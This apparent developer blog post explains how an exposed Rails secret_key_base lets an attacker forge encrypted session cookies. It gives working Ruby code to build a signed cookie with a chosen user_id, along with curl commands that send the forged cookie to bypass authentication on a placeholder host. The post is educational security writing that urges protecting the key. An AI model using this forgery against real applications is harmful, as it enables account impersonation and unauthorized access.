---
layout: post
title: "Security On Rails: Hacking Sessions With Insecure Secret Key Base"
date: 2016-04-24 20:00
comments: true
categories: [Rails, Ruby on Rails, Security]
---

<p>I was recently asked what is <code>secret key base</code> used for in Rails applications and why not secure value of it (or even worse - the public one!) creates a security issue. That was a really good question, I remember how it was a serious threat years ago, especially before introducing <code>secrets.yml</code> in Rails 4.1 - at that time by default <code>secret_token</code> initializer was generated and the secret key was directly stored there. The result was that in many open source projects secret key was publicly available creating a great <strong>security risk</strong>. Let's take a look how exposed secret key base could be exploited.</p>

<!--more-->

<h2>Anatomy of possible attack</h2>

<p>Imagine that <code>current_user</code> lookup in some application is performed like this:</p>

``` ruby
def current_user
  @current_user ||= User.find(session[:user_id]) if session[:user_id].present?
end
```

<p>Using <code>user_id</code> for storing id of the logged in user seems like an obvious choice. If I knew the <code>secret key base</code>, I could try encrypting the following hash:</p>

``` ruby
malicious_hash = {user_id: 10, session_id: "123abc"}
```

<p>and send carefully crafted cookie pretending that I'm logged in as the user with id 10! The question is: how would I do it? Ok, maybe I have a <code>secret key base</code>, but what exactly should be done with it? What are the necessary steps to generate such a cookie that will be successfully decrypted later by Rails application?</p>

<p>I was browsing through Rails source code and here's what I've come up with:</p>


``` ruby
def generate_encrypted_cookie(data_hash, secret_key_base)
  # inspired by https://github.com/rails/rails/blob/v4.2.6/actionpack/test/dispatch/cookies_test.rb#L595 and https://github.com/rails/rails/blob/v4.2.6/actionpack/lib/action_dispatch/middleware/cookies.rb#L527
  salt = "encrypted cookie" # default value from Rails.application.config.action_dispatch.encrypted_cookie_salt
  signed_salt = "signed encrypted cookie" # default value from Rails.application.config.action_dispatch.encrypted_signed_cookie_salt
  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000) # based on https://github.com/rails/rails/blob/v4.2.6/railties/lib/rails/application.rb#L179

  secret = key_generator.generate_key(salt)
  sign_secret = key_generator.generate_key(signed_salt)

  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
  encryptor.encrypt_and_sign(data_hash)
end
```

<p>This is basically how Rails handles encrypting the session data. The last thing we are missing is <code>session store key</code>, which is not really a secret value, you can get one simply by using <code>curl</code>:</p>

```
curl -I http://hack-me.dev
```

<p>And one of the headers will be in the following format:</p>

```
Set-Cookie: _HackMe_session=asj7dli45a43f8rjm67djst; path=/; secure; HttpOnly
```

<p><code>_HackMe_session</code> is our missing puzzle. Let's try creating encrypted cookie based on our <code>malicious_hash</code> and exposed <code>secret_key_base</code>:</p>

``` irb
generate_encrypted_cookie(malicious_hash, secret_key_base)
=> "dU9WQzF5RzVXdGNOcks1NGlMd3pTcTZINVdvYVNtampxZndUR2E2MmpZeTZ4MjFrWnYwKzJ3T1ladVdla250ci0tY1oxQkdnWUcrUWprZTZsMnZTbGdoUT09--b6dfdafc2456fb174239deb428fdee80a0cfe8f3"
```

<p>Assuming that there is some page requiring authentication which redirects to login page if user is not logged in, there are 2 possible scenarios: either user is authenticated and 200 HTTP code is returned or user is redirected with 302 status. To pretend that we are logged in we could perform the following request:</p>

```
curl -I http://hack-me.dev/page-requiring-authentication --cookie "_HackMe_session=dU9WQzF5RzVXdGNOcks1NGlMd3pTcTZINVdvYVNtampxZndUR2E2MmpZeTZ4MjFrWnYwKzJ3T1ladVdla250ci0tY1oxQkdnWUcrUWprZTZsMnZTbGdoUT09--b6dfdafc2456fb174239deb428fdee80a0cfe8f3"
```

<p>As a result you should see <code>HTTP/1.1 200 OK</code>, which means you've successfully bypassed authentication :).</p>


<h2>Wrapping up</h2>

<p>As you now know, having secure and securely stored <code>secret key base</code> is an essential thing for the security of the app. Rails applications are now much more secure by default than it used to be and seems that accidentally exposing <code>secret key base</code> is not likely to happen. Nevertheless, it is still a very important thing to be aware of.</p>
